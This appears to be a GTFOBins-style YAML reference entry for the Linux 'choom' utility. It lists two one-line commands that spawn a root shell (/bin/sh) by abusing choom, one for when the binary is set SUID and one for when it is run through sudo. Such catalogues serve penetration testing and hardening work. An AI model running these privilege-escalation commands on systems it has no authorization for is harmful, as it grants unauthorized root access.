---
functions:
  suid:
    - code: ./choom -n 00 -- '/bin/sh' '-p'
  sudo:
    - code: sudo choom -n 00 -- '/bin/sh'
---
